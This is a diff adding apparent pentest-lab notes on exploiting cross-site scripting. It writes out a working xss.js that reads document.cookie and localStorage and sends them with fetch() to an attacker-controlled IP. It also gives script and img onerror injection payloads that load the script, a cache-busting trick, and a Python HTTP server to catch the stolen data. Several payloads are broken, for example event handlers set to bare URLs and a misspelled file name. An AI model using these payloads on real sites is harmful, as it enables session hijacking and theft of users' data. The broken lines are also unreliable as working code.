@@ -1,0 +1,38 @@
+Using JavaScript, we can access the cookies of a page using the document.cookie property. We'll extract this value, URL encode it, and use fetch to send it back to our Kali VM. All of this will be done in the xss.js file.
+
+nano xss.js
+cat xss.js
+let cookie = document.cookie
+
+let encodedCookie = encodeURIComponent(cookie)
+
+fetch("http://192.168.49.51/exfil?data=" + encodedCookie)
+
+we'll start the HTTP server with python3 -m http.server 80.
+
+python3 -m http.server 80
+
+The payload will append a script element to the HTML document and the script tag will load the xss.js file from our Kali machine. Let's submit the search and exploit the XSS.
+
+<script src="http://192.168.45.171/xss.js"></script>
+<img src="x" onerror="http://192.168.45.171/xss.js">
+
+If your server is responding with 304 Not Modified, it means the browser is caching the request and not reloading xss.js. This happens because the browser thinks it already has the latest version of the script and doesn’t need to download it again.
+
+<img src="x" onerror="var s=document.createElement('script'); s.src='http://192.168.45.171/xsss.js?' + Math.random(); document.body.appendChild(s);">
+
+? + Math.random() adds a random query string (xss.js?0.4567), making it look like a new request every time.
+
+<input type="text" value="http://192.168.45.171/xss.js">
+<div onmouseover="http://192.168.45.171/xss.js">Hover Me</div>
+<a href="#" onclick="http://192.168.45.171/xss.js">Click Me</a>
+
+To exfiltrate localStorage, we'll convert the object into a string, URL encode the string, and use fetch to send the data back to us.
+
+let data = JSON.stringify(localStorage)
+
+let encodedData = encodeURIComponent(data)
+
+fetch("http://192.168.49.51/exfil?data=" + encodedData)
+
+kali@kali:~/xss$ python3 -m http.server 80
